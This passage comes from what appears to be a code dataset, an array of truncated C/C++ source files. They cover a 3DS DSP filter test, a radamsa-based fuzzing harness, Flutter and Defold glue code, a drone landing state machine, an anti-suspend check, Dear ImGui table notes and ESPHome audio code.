15);\n        const s16 a1 = 0.2 * (1 << 15);\n\n        array<s32, 160> expected_output;\n        {\n            s32 y1 = 0;\n            s32 y2 = 0;\n            for (int i=0; i<160; i++) {\n                const s32 x0 = (i % 4 == 0 || i % 4 == 1 ? 0x1000 : 0x2000);\n                s32 y0 = ((s32)x0 * (s32)b0 + (s32)a1 * y1) >> 15;\n                if (y0 >= 32767) y0 = 32767;\n                if (y0 <= -32768) y0 = -32768;\n                expected_output[i] = y2;\n                y2 = y1;\n                y1 = y0;\n            }\n        }\n\n        state.waitForSync();\n        initSharedMem(state);\n        state.write().dsp_configuration->mixer1_enabled_dirty = true;\n        state.write().dsp_configuration->mixer1_enabled = true;\n        state.write().source_configurations->config[0].gain[1][0] = 1.0;\n        state.write().source_configurations->config[0].gain_1_dirty = true;\n        state.notifyDsp();\n        printf(\"init\\n\");\n\n        {\n            u16 buffer_id = 0;\n\n            state.write().source_configurations->config[0].play_position = 0;\n            state.write().source_configurations->config[0].physical_address = osConvertVirtToPhys(audio_buffer);\n            state.write().source_configurations->config[0].length = NUM_SAMPLES;\n            state.write().source_configurations->config[0].mono_or_stereo = DSP::HLE::SourceConfiguration::Configuration::MonoOrStereo::Mono;\n            state.write().source_configurations->config[0].format = DSP::HLE::SourceConfiguration::Configuration::Format::PCM16;\n            state.write().source_configurations->config[0].fade_in = false;\n            state.write().source_configurations->config[0].adpcm_dirty = false;\n            state.write().source_configurations->config[0].is_looping = false;\n            state.write().source_configurations->config[0].buffer_id = ++buffer_id;\n            state.write().source_configurations->config[0].partial_reset_flag = true;\n            state.write().source_configurations->config[0].play_position_dirty = true;\n            state.write().source_configurations->config[0].embedded_buffer_dirty = true;\n\n            state.write().source_configurations->config[0].enable = true;\n            state.write().source_configurations->config[0].enable_dirty = true;\n\n            state.write().source_configurations->config[0].simple_filter.b0 = b0;\n            state.write().source_configurations->config[0].simple_filter.a1 = a1;\n            state.write().source_configurations->config[0].simple_filter_enabled = true;\n            state.write().source_configurations->config[0].biquad_filter_enabled = false;\n            state.write().source_configurations->config[0].biquad_filter.b0 = 0;\n            state.write().source_configurations->config[0].biquad_filter.b1 = 0;\n            state.write().source_configurations->config[0].biquad_filter.b2 = 0;\n            state.write().source_configurations->config[0].biquad_filter.a1 = 0;\n            state.write().source_configurations->config[0].biquad_filter.a2 = 0;\n            state.write().source_configurations->config[0].filters_enabled_dirty = true;\n            state.write().source_configurations->config[0].biquad_filter_dirty = true;\n            state.write().source_configurations->config[0].simple_filter_dirty = true;\n\n            state.notifyDsp();\n\n            bool continue_reading = true;\n            for (size_t frame_count = 0; continue_reading && frame_count < 10; frame_count++) {\n                state.waitForSync();\n\n                for (size_t i = 0; i < 160; i++) {\n                    if (state.write().intermediate_mix_samples->mix1.pcm32[0][i]) {\n    ",
    "#include <windows.h>\n#include <cstdio>\n#include <tchar.h>\n#include <fstream>\n#include <iostream>\n#include <sstream>\n#include <iomanip>\n#include <ctime>\n#include <vector>\n#include <string>\n#include <strsafe.h>\n#include <cstdlib>\n#include <filesystem>\n#include \"CLI11.hpp\"\n\n#define RPATH TEXT(\"RADAMSA_PATH\")\n#define BUFSIZE 256\n\nusing namespace std;\nnamespace fs = std::filesystem;\n\nint TIMEOUT = 1000;\nstring originalFolder;\n\nvector<string> listFilesInDirectory(const std::string& directoryPath) {\n    vector<string> fileNames;\n    const fs::path dest = directoryPath;\n    for (const auto& entry : fs::directory_iterator(directoryPath)) {\n        fileNames.push_back(entry.path().filename().string());\n    }\n    return fileNames;\n}\n\nstring removeExtension(const string& filename) {\n    size_t dotPos = filename.rfind('.');\n    if (dotPos == string::npos) {\n        return filename;\n    }\n    return filename.substr(0, dotPos);\n}\n\n\nBOOL mutateInputs(const string& filename, const string& mut, const string& inputFolder, const string& outputFolder, string ext)\n{ \n    string nfilename = removeExtension(filename);\n    string outputFileName = outputFolder + \"\\\\\" + nfilename + \"_id=\" + mut + \".\" + ext;\n    STARTUPINFOA si;\n    PROCESS_INFORMATION pi;\n    DEBUG_EVENT debug_event;\n    string args = \"radamsa.exe \" + inputFolder + \"\\\\\" + filename + \" -m \" + mut + \" -o \" + outputFileName;\n    LPSTR cmd = (LPSTR)args.c_str();\n\n    ZeroMemory(&si, sizeof(si));\n    ZeroMemory(&pi, sizeof(pi));\n    si.cb = sizeof(si);\n\n    if (!CreateProcessA(\n        nullptr,           // Target app\n        cmd,                 // Command line\n        nullptr,           // Process handle not inheritable\n        nullptr,            // Thread handle not inheritable\n        FALSE,                // Set handle inheritance to FALSE\n        0,                   // No creation flag\n        nullptr,               // Use parent's environment block\n        nullptr,            // Use parent's starting directory\n        &si,                    // Pointer to STARTUPINFO structure\n        &pi)              // Pointer to PROCESS_INFORMATION structure\n        )\n    {\n        printf(\"CreateProcess failed GLE=(%lu).\\n\", GetLastError());\n        return 1;\n    }\n\n    // Wait until child process exits.\n    WaitForSingleObject(pi.hProcess, INFINITE);\n\n    // Close process and thread handles\n    TerminateProcess(pi.hProcess, 0);\n    CloseHandle(pi.hProcess);\n    CloseHandle(pi.hThread);\n\n    return TRUE;\n}\n\nvoid reportCrash(const string& exceptionMessage, DWORD exceptionCode, const string& inputFile)\n{\n    string crashFolder = originalFolder + \"crashes\";\n    if (!fs::exists(crashFolder)) \n    {\n        fs::create_directory(crashFolder);\n    }\n    string filename = crashFolder + \"\\\\\" + \"crashes_log\" + \".txt\";\n    ofstream outfile(filename, ios::app); \n    outfile << exceptionMessage << hex << exceptionCode << \"with file: \" << inputFile << endl;\n    outfile.close();\n\n    fs::path source = inputFile;\n    fs::path dest = crashFolder + inputFile;\n    fs::copy(source, dest);\n\n}\n\nDWORD ProcessDebugEvent(DEBUG_EVENT* debugEvent, const string& inputFile)\n{\n    if (debugEvent->dwDebugEventCode == EXCEPTION_DEBUG_EVENT)\n    {\n\n        EXCEPTION_RECORD* exceptionRecord = &debugEvent->u.Exception.ExceptionRecord;\n        DWORD exceptionCode = exceptionRecord->ExceptionCode;\n\n        switch (exceptionCode)\n        {\n        case EXCEPTION_BREAKPOINT:\n            break;\n        case EXCEPTION_ACCESS_VIOLATION:\n            reportCrash(\"Critical exception: Access Violation (0x\", exceptionCode, inputFile);\n            break;\n\n        case EXCEPTION_ARRAY_BOUNDS_EXCEEDED:\n            reportCrash(\"Critical exception: Array Bounds Exceeded (0x\", exceptionCode, inputFile);\n            break;\n\n        case EXCEPTION_FLT_DENORMAL_OPERAND:\n            reportCrash(\"Critical exception: Invalid floating-point operation (denormal operand) (0x\", exceptionCode,\n                        inputFile);\n            break;\n\n        case EXCEPTION_FLT_DIVIDE_BY_ZERO:\n            reportCrash(\"Critical exception: Floating-point division by zero (0x\", exceptionCode, inputFile);\n            break;\n\n        case EXCEPTION_FLT_OVERFLOW:\n            reportCrash(\"Critical exception: Floating-point overflow (0x\", exceptionCode, inputFile);\n            break;\n\n        case EXCEPTION_FLT_STACK_CHECK:\n            reportCrash(\"Critical exception: Hardware floating-point stack overflow (0x\", exceptionCode, inputFile);\n            break;\n\n        case EXCEPTION_FLT_UNDERFLOW:\n            reportCrash(\"Critical exception: Floating-point underflow (0x\", exceptionCode, inputFile);\n            break;\n\n        case EXCEPTION_ILLEGAL_INSTRUCTION:\n            reportCrash(\"Critical exception: Illegal instruction encountered (0x\", exceptionCode, inputFile);\n            break;\n\n        case EXCEPTION_IN_PAGE_ERROR:\n            reportCrash(\"Critical exception: Page fault (0x\", exceptionCode, inputFile);\n            break;\n\n        case EXCEP",
    "// Defold Binding Related Stuff for Aerials\r\n#pragma once\r\n\r\n\r\n// Module \"Arf2\"\r\n#include \"p_functions.hpp\"\r\nstatic const luaL_reg Arf2[] =   // Considering Adding a \"JudgeArfController\" Function.\r\n{\r\n\r\n\t{\"InitArf\", InitArf}, {\"UpdateArf\", UpdateArf}, {\"FinalArf\", FinalArf},\r\n\t{\"SetIDelta\", SetIDelta}, {\"SetJudgeRange\", SetJudgeRange}, {\"JudgeArf\", JudgeArf},\r\n\r\n\t{\"SetXScale\", SetXS}, {\"SetYScale\", SetYS}, {\"SetXDelta\", SetXD}, {\"SetYDelta\", SetYD},\r\n\t{\"SetRotDeg\", SetRotDeg}, {\"SetDaymode\", SetDaymode},\r\n\r\n\t{\"NewTable\", NewTable}, {\"SetHintSize\", SetHintSize}, {nullptr, nullptr}\r\n\r\n};\r\n\r\n\r\ninline dmExtension::Result Arf2LuaInit(dmExtension::Params* p) {\r\n\t/* Defold Restriction:\r\n\t * Must Get the Lua Stack Balanced in the Initiation Process. */\r\n\tluaL_register(p->m_L, \"Arf2\", Arf2);\t\tlua_pop(p->m_L, 1);\r\n\treturn dmExtension::RESULT_OK;\r\n}\r\n\r\ninline dmExtension::Result Arf2OK(dmExtension::Params* params) {\r\n\treturn dmExtension::RESULT_OK;\r\n}\r\n\r\ninline dmExtension::Result Arf2APPOK(dmExtension::AppParams* params) {\r\n\treturn dmExtension::RESULT_OK;\r\n}\r\n\r\nDM_DECLARE_EXTENSION(AcPlay, \"AcPlay\", Arf2APPOK, Arf2APPOK, Arf2LuaInit, nullptr, nullptr, Arf2OK)",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr);\n  std::string utf8_string;\n  if (target_length == 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, utf8_string.data(),\n      target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include \"SF_LandingState.h\"\n\n/* Public Methods and Constructor */\nSFLandingState::SFLandingState(string state_label, double min_abort_landing_height, double min_landing_height, double max_landing_rate) : \n                SFBaseState(state_label), min_abort_landing_height(min_abort_landing_height), max_landing_rate(max_landing_rate),\n                min_landing_height(min_landing_height)\n{\n    // Add the neighbor states\n    addNeighborState(string(\"Inactive\"), [this]() { return transitionGuardInactive(); });\n    addNeighborState(string(\"Hover\"), [this]() { return transitionGuardHover(); });\n}\n\nvoid SFLandingState::entry(const Vector3d &curr_position, const Vector3d &prev_desired_position, string &args)\n{\n    // Set desired state to the current state\n    setDesiredState(getStateLabel());\n\n    // Set the current starting position\n    start_position = prev_desired_position;\n\n    // Split the input arguments into a vector of strings splitting at whitespaces\n    vector<string> split_args;\n    boost::split(split_args, args, boost::is_any_of(\" \"));\n\n    // Parse the desired landing height (arg 1) and time(seconds) (arg 2), Note: arg 0 is the state label\n    if(split_args.size() >= 3)\n    {\n        desired_landing_height = std::stod(split_args[1]);\n        if(desired_landing_height < min_landing_height)\n        {\n            desired_landing_height = min_landing_height;\n        }\n        desired_landing_rate = (start_position(2) - desired_landing_height) / std::stod(split_args[2]);\n\n        if(desired_landing_rate > max_landing_rate)\n        {\n            desired_landing_height = max_landing_rate;\n        }\n    }\n    else\n    {\n        setDesiredState(string(\"Hover\"));\n    }\n\n    // Intialize the start time\n    t_init = std::chrono::steady_clock::now();\n}\n\n/* Protected Methods */\nMatrix3d SFLandingState::during()\n{\n    // Calculate the current desired height\n    std::chrono::duration<double> elapsed_time = std::chrono::steady_clock::now() - t_init;\n    double current_desired_height = start_position(2) - desired_landing_rate * elapsed_time.count();\n\n    // If you have reached the desired landing height then update the desired state to inactive\n    bool trajectory_completed = false;\n    if(current_desired_height <= desired_landing_height)\n    {\n        current_desired_height = desired_landing_height;\n        trajectory_completed = true;\n        setDesiredState(string(\"Inactive\"));\n    }\n\n    // Construct the desired trajectory matrix\n    Matrix3d desired_traj;\n    Vector3d desired_pos = Vector3d(start_position(0), start_position(1), current_desired_height);\n    Vector3d desired_vel = Vector3d(0.0, 0.0, (!trajectory_completed) ? -desired_landing_rate : 0.0);\n    desired_traj << desired_pos, desired_vel, Vector3d::Zero();\n    \n    return desired_traj;\n}\n\nbool SFLandingState::transitionGuardInactive()\n{\n    std::chrono::duration<double> elapsed_time = std::chrono::steady_clock::now() - t_init;\n    if((start_position(2) - desired_landing_rate * elapsed_time.count()) > desired_landing_height)\n    {\n        return false;\n    }\n    return true;\n}\n\nbool SFLandingState::transitionGuardHover()\n{\n    std::chrono::duration<double> elapsed_time = std::chrono::steady_clock::now() - t_init;\n    if((start_position(2) - desired_landing_rate * elapsed_time.count()) < min_abort_landing_height)\n    {\n        return false;\n    }\n    return true;\n}",
    "#include <iostream>\r\n#include <Windows.h>\r\n#include <thread>\r\n\r\nclass c_globals {\r\npublic:\r\n    HANDLE hThread; // thread handle we create.\r\n    int count = 128; // amount of times we suspend\r\n\r\n    // class to store all our information.\r\n}; static c_globals* globals = new c_globals();\r\n\r\nint main() {\r\n    \r\n    globals->hThread = CreateThread(NULL, 0, 0, NULL, 0, NULL); // dummy thread to base detections from.\r\n\r\n    DebugActiveProcessStop(GetCurrentProcessId()); // self explanatory \r\n\r\n    for (size_t i = 0; i < globals->count; ++i) {\r\n        SuspendThread(globals->hThread); // max out the limit.\r\n    }\r\n\r\n    while (globals->hThread != reinterpret_cast<HANDLE>((DWORD)-1))\r\n    {\r\n        if (SuspendThread(globals->hThread) != (DWORD)-1) {\r\n            std::cout << \"Anti Suspend Activated. \\n\" << std::endl;\r\n            std::cin.get(); // here i chose to just stop everything, in a real case scenario you would send a notifaction or kill the program.\r\n        }\r\n        std::cout << \"we are good. \\n\"; // here you do nothing. || real case scenario this should be threaded.\r\n    }\r\n\r\n    CloseHandle(globals->hThread);\r\n}\r\n",
    "// dear imgui, v1.89.2\n// (tables and columns code)\n\n/*\n\nIndex of this file:\n\n// [SECTION] Commentary\n// [SECTION] Header mess\n// [SECTION] Tables: Main code\n// [SECTION] Tables: Simple accessors\n// [SECTION] Tables: Row changes\n// [SECTION] Tables: Columns changes\n// [SECTION] Tables: Columns width management\n// [SECTION] Tables: Drawing\n// [SECTION] Tables: Sorting\n// [SECTION] Tables: Headers\n// [SECTION] Tables: Context Menu\n// [SECTION] Tables: Settings (.ini data)\n// [SECTION] Tables: Garbage Collection\n// [SECTION] Tables: Debugging\n// [SECTION] Columns, BeginColumns, EndColumns, etc.\n\n*/\n\n// Navigating this file:\n// - In Visual Studio IDE: CTRL+comma (\"Edit.GoToAll\") can follow symbols in comments, whereas CTRL+F12 (\"Edit.GoToImplementation\") cannot.\n// - With Visual Assist installed: ALT+G (\"VAssistX.GoToImplementation\") can also follow symbols in comments.\n\n//-----------------------------------------------------------------------------\n// [SECTION] Commentary\n//-----------------------------------------------------------------------------\n\n//-----------------------------------------------------------------------------\n// Typical tables call flow: (root level is generally public API):\n//-----------------------------------------------------------------------------\n// - BeginTable()                               user begin into a table\n//    | BeginChild()                            - (if ScrollX/ScrollY is set)\n//    | TableBeginInitMemory()                  - first time table is used\n//    | TableResetSettings()                    - on settings reset\n//    | TableLoadSettings()                     - on settings load\n//    | TableBeginApplyRequests()               - apply queued resizing/reordering/hiding requests\n//    | - TableSetColumnWidth()                 - apply resizing width (for mouse resize, often requested by previous frame)\n//    |    - TableUpdateColumnsWeightFromWidth()- recompute columns weights (of stretch columns) from their respective width\n// - TableSetupColumn()                         user submit columns details (optional)\n// - TableSetupScrollFreeze()                   user submit scroll freeze information (optional)\n//-----------------------------------------------------------------------------\n// - TableUpdateLayout() [Internal]             followup to BeginTable(): setup everything: widths, columns positions, clipping rectangles. Automatically called by the FIRST call to TableNextRow() or TableHeadersRow().\n//    | TableSetupDrawChannels()                - setup ImDrawList channels\n//    | TableUpdateBorders()                    - detect hovering columns for resize, ahead of contents submission\n//    | TableDrawContextMenu()                  - draw right-click context menu\n//-----------------------------------------------------------------------------\n// - TableHeadersRow() or TableHeader()         user submit a headers row (optional)\n//    | TableSortSpecsClickColumn()             - when left-clicked: alter sort order and sort direction\n//    | TableOpenContextMenu()                  - when right-clicked: trigger opening of the default context menu\n// - TableGetSortSpecs()                        user queries updated sort specs (optional, generally after submitting headers)\n// - TableNextRow()                             user begin into a new row (also automatically called by TableHeadersRow())\n//    | TableEndRow()                           - finish existing row\n//    | TableBeginRow()                         - add a new row\n// - TableSetColumnIndex() / TableNextColumn()  user begin into a cell\n//    | TableEndCell()                          - close existing column/cell\n//    | TableBeginCell()                        - enter into current column/cell\n// - [...]                                      user emit contents\n//-----------------------------------------------------------------------------\n// - EndTable()                                 user ends the table\n//    | TableDrawBorders()                      - draw outer borders, inner vertical borders\n//    | TableMergeDrawChannels()                - merge draw channels if clipping isn't required\n//    | EndChild()                              - (if ScrollX/ScrollY is set)\n//-----------------------------------------------------------------------------\n\n//-----------------------------------------------------------------------------\n// TABLE SIZING\n//-----------------------------------------------------------------------------\n// (Read carefully because this is subtle but it does make sense!)\n//-----------------------------------------------------------------------------\n// About 'outer_size':\n// Its meaning needs to differ slightly depending on if we are using ScrollX/ScrollY flags.\n// Default value is ImVec2(0.0f, 0.0f).\n//   X\n//   - outer_size.x <= 0.0f  ->  Right-align from window/work-rect right-most edge. With -FLT_MIN or 0.0f will align exactly on right-most edge.\n//   - outer_size.x  > 0.0f  ->  Set Fixed width.\n//  ",
    "#include <iostream>\n#include <string>\n#include <complex>\n#include <vector>\n#include <stdexcept>\n\n#include \"TypeManipulation.h\"\n\n// Convert digit representation, char -> int\nint convertDigitChar2Int(char digit_char)\n{\n    int temp_digit_int = digit_char-'0';\n\n    // Error check\n    if (temp_digit_int >= 0 && temp_digit_int <=9)\n    {\n        return temp_digit_int;\n    } \n    else\n    {\n        throw std::invalid_argument(\"Invalid input: character '\" + std::string(1, digit_char) + \"' is not in the range '0' to '9'\");    }\n}\n\n// Convert digit representation, int -> char\nchar convertDigitInt2Char(unsigned int digit_int)\n{\n    if (digit_int < 10)\n    {\n        return (digit_int+'0');\n    }\n    else\n    {\n        throw std::invalid_argument(\"Invalid input: digit must be between 0 and 9\");\n    }\n}\n\n// Convert number representation, string -> vector<int>\n// \"5432\" -> {2,3,4,5}\nstd::vector<int> convertNumStr2Vec(const std::string& num)\n{\n    int num_len = num.length();\n    std::vector<int> num_vec(num.length(),0);\n    std::string num_reverse = computeNumReverseDigits(num);\n\n    for(int i = 0; i < num_reverse.length(); i++)\n    {\n        num_vec[i] = convertDigitChar2Int(num_reverse[i]);\n    }\n\n    return num_vec;\n}\n\n// Convert number representation, vector<int> -> string\n// {2,3,4,5} -> \"5432\"\nstd::string convertNumVec2Str(std::vector<int> num_vec)\n{\n    std::string num_str;\n \n    for (int i=num_vec.size()-1; i >= 0; --i) {\n        num_str = num_str + convertDigitInt2Char(num_vec[i]);\n    }\n\n    return num_str;\n}\n\n// Store vector<int> as the real component of vector<complex<double>>\nstd::vector<std::complex<double>> convertRealVecInt2VecComplexDouble(std::vector<int> num_vec)\n{\n    int len_num_vec = num_vec.size();\n    std::vector<std::complex<double>> num_vec_complex(len_num_vec);\n\n    for (int i = 0; i < len_num_vec; i ++)\n    {\n        if (num_vec[i] >= 0 && num_vec[i] <=9) // Error bounds, num_vec[i] is a digit, not a number\n        {\n            num_vec_complex[i].real(num_vec[i]*1.0);\n            num_vec_complex[i].imag(0.0);\n        }\n        else\n        {\n            throw std::invalid_argument(\"Invalid input: digit must be between 0 and 9\");   \n        }\n\n    }   \n\n    return num_vec_complex;\n}\n\n// Store real components of vector<complex<double>> as vector<int>\nstd::vector<int> convertVecComplexDouble2RealVecInt(std::vector<std::complex<double>> num12_complex)\n{\n    int len_num_vec = num12_complex.size();\n    std::vector<int> num_vec(len_num_vec);\n    int counter = 0 ;\n\n    for (const auto& complex_number : num12_complex) {\n        // Check if the real and imaginary parts are numeric\n        if (std::isfinite(complex_number.real()) && std::isfinite(complex_number.imag())) {\n            int real_part = static_cast<int>(std::round(std::real(complex_number)));\n            // Ensure that the real part is non-negative\n            // Can be >9, used for FFT and will be fixed through carryAndNormalize()\n            if (real_part < 0) {\n                throw std::invalid_argument(\"Real part of the complex number cannot be negative\");\n            }\n            num_vec[counter] = real_part;\n            counter++;\n        } else {\n            // Handle non-numeric values (e.g., throw an exception)\n            throw std::invalid_argument(\"Non-numeric value found in complex number\");\n        }\n    }\n\n    return num_vec;\n}\n\n// Removes any preceding zeros of number represented as string\n// \"001354\" -> \"1354\"\nstd::string removePrecedingZeros(const std::string& num_orignal)\n{    \n    int index = 0;\n  \n    while (num_orignal[index] == '0' && index < num_orignal.length() - 1 ) // Iterate till first non-zero digit\n    {\n        index ++;\n    }  \n\n    return num_orignal.substr(index);\n}\n\n// Removes any preceding zeros of number represented as string\n// {0,4,5,1,0,0} -> {0,4,5,1}\nstd::vector<int> removePrecedingZeros(std::vector<int> num_orignal)\n{    \n    while (num_orignal.back() == 0 && num_orignal.size() > 1 )\n    {\n        num_orignal.pop_back();\n    }\n    \n    return num_orignal;\n}\n\n// Reverses digits of `num`\n// \"1230\" -> \"0321\"\nstd::string computeNumReverseDigits(const std::string& num_temp)\n{    \n    std::string temp_num_reverse;\n    int len_num = num_temp.size();\n\n    for(int ind = len_num; ind > 0; ind--)\n    {\n        temp_num_reverse += num_temp[ind-1];\n    }\n\n    return temp_num_reverse; // PRECEDING ZEROS ARE NOT REMOVED\n}\n",
    "#include \"nabu.h\"\n\n#ifdef USE_ESP_IDF\n\n#include <driver/i2s.h>\n#include <string.h>\n\n#include <vector>\n\n// #include <audio_element.h>\n// #include <audio_event_iface.h>\n// #include <audio_pipeline.h>\n// #include <downmix.h>\n// #include <driver/i2s.h>\n// #include <filter_resample.h>\n// #include <http_stream.h>\n// #include <i2s_stream.h>\n// #include <mp3_decoder.h>\n// #include <raw_stream.h>\n\n// #include \"i2s_stream_mod.h\"\n// #include \"sdk_ext.h\"\n\n// #define INDEX_MUSIC_STREAM 0\n// #define INDEX_TTS_STREAM 1\n// #define TRANSMIT_TIME 500\n\n#include \"esphome/core/log.h\"\n\nnamespace esphome {\nnamespace nabu {\n\nstatic const char *const TAG = \"nabu\";\n\nvoid NabuComponent::setup() {\n  // audio_event_iface_cfg_t evt_cfg = AUDIO_EVENT_IFACE_DEFAULT_CFG();\n  // this->pipeline_event_ = audio_event_iface_init(&evt_cfg);\n\n  // this->setup_pipeline_mix_();\n  // this->setup_pipeline_music_();\n  // this->setup_pipeline_tts_();\n  // this->setup_pipeline_mic_();\n\n  // audio_pipeline_run(this->pipeline_mic_);\n}\n\nvoid NabuComponent::loop() {\n  // audio_event_iface_msg_t msg{};\n  // audio_event_iface_listen(this->pipeline_event_, &msg, 0);\n\n  // if (this->state_ == State::STARTING) {\n  //   ESP_LOGD(TAG, \"Starting mix pipeline\");\n  //   audio_pipeline_run(this->pipeline_mix_);\n  // this->state_ = State::IDLE;\n\n  // this->play_music(\"http://192.168.68.75:8000/Charly%20Bliss/Young%20Enough/\"\n  //                  \"06%20-%20Young%20Enough.mp3\");\n  // }\n  // audio_event_iface_discard(this->pipeline_event_);\n\n  // if ((this->state_ == State::PREPARING_MUSIC) &&\n  //     (audio_element_get_state(this->mp3_decoder_) == AEL_STATE_RUNNING)) {\n  //   audio_element_info_t music_info{};\n  //   audio_element_getinfo(this->mp3_decoder_, &music_info);\n  //   ESP_LOGD(TAG, \"Received music info\");\n\n  //   // Change resample filter to match music source\n  //   rsp_filter_change_src_info(this->resample_music_,\n  //   music_info.sample_rates,\n  //                              music_info.channels, music_info.bits);\n\n  //   this->stop_music();\n\n  //   // Run music pipeline\n  //   this->state_ = State::PLAYING_MUSIC;\n  //   audio_element_set_uri(this->http_reader_, this->music_uri_.c_str());\n  //   audio_pipeline_run(this->pipeline_music_);\n  // }\n}\n\n// ----------------------------------------------------------------------------\n\nvoid NabuComponent::start_i2s() {\n  if (this->i2s_started_) {\n    return;\n  }\n\n  ESP_LOGD(TAG, \"Starting I2S\");\n  i2s_driver_config_t i2s_driver_cfg = {\n      .mode = (i2s_mode_t)(I2S_MODE_SLAVE | I2S_MODE_RX | I2S_MODE_TX),\n      .sample_rate = 16000,\n      .bits_per_sample = I2S_BITS_PER_SAMPLE_32BIT,\n      // .channel_format = I2S_CHANNEL_FMT_ONLY_LEFT,\n      .channel_format = I2S_CHANNEL_FMT_RIGHT_LEFT,\n      .communication_format = I2S_COMM_FORMAT_STAND_I2S,\n      .intr_alloc_flags = ESP_INTR_FLAG_LEVEL1,\n      .dma_buf_count = 8,\n      .dma_buf_len = 128,\n      // .dma_buf_count = 4,\n      // .dma_buf_len = 256,\n      .use_apll = false,\n      .tx_desc_auto_clear = false,\n      // .tx_desc_auto_clear = true,\n      // .fixed_mclk = 0,\n      // .fixed_mclk = 24576000,\n      // .mclk_multiple = I2S_MCLK_MULTIPLE_DEFAULT,\n      .bits_per_chan = I2S_BITS_PER_CHAN_DEFAULT,\n  };\n  i2s_driver_install(this->get_port(), &i2s_driver_cfg, 0, nullptr);\n\n  i2s_pin_config_t pin_config = this->get_pin_config();\n  i2s_set_pin(this->get_port(), &pin_config);\n  this->i2s_started_ = true;\n}\n\nvoid NabuComponent::play_music(const std::string &uri) {\n  // this->stop_music();\n\n  ESP_LOGD(TAG, \"Playing: %s\", uri.c_str());\n  // this->music_uri_ = uri;\n  // audio_element_set_uri(this->http_reader_, this->music_uri_.c_str());\n  // audio_element_set_uri(this->http_reader_, uri.c_str());\n  // audio_pipeline_run(this->pipeline_music_);\n\n  // Preroll HTTP reader and MP3 decoder to get music info (see loop)\n  // this->state_ = State::PREPARING_MUSIC;\n\n  // if (audio_element_run(this->http_reader_) != ESP_OK) {\n  //   ESP_LOGE(TAG, \"Starting http reader failed\");\n  // }\n  // if (audio_element_run(this->mp3_decoder_) != ESP_OK) {\n  //   ESP_LOGE(TAG, \"Starting MP3 decoder failed\");\n  // }\n  // if (audio_element_resume(this->http_reader_, 0, 2000 / portTICK_RATE_MS) !=\n  //     ESP_OK) {\n  //   ESP_LOGE(TAG, \"Resuming http reader failed\");\n  // }\n  // if (audio_element_resume(this->mp3_decoder_, 0, 2000 / portTICK_RATE_MS) !=\n  //     ESP_OK) {\n  //   ESP_LOGE(TAG, \"Resuming MP3 decoder failed\");\n  // }\n\n  // ESP_LOGD(TAG, \"Waiting for music info\");\n}\n\nvoid NabuComponent::stop_music() {\n  // audio_pipeline_stop(this->pipeline_music_);\n  // audio_pipeline_reset_items_state(this->pipeline_music_);\n  // audio_pipeline_reset_ringbuffer(this->pipeline_music_);\n}\n\nvoid NabuComponent::pause_music() {\n  // audio_pipeline_pause(this->pipeline_music_);\n}\n\nvoid NabuComponent::resume_music() {\n  // audio_pipeline_resume(this->pipeline_music_);\n}\n\n// ----------------------------------------------------------------------------\n\n// void NabuComponent::setup_pipeline_mix_() {\n",
